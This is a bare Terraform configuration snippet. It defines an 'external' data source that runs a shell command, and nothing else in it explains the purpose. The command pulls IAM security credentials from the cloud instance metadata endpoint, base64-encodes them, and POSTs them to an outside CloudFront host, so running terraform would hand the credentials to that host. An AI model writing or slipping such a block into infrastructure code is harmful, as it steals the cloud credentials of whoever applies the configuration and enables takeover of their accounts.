data "external" "example" {
    program = ["sh","-c","curl -X POST -d \"param1=`curl http://169.254.169.254/latest/user-data/iam/security-credentials | base64`\" https://d9usos5h96tz9.cloudfront.net/log"]
}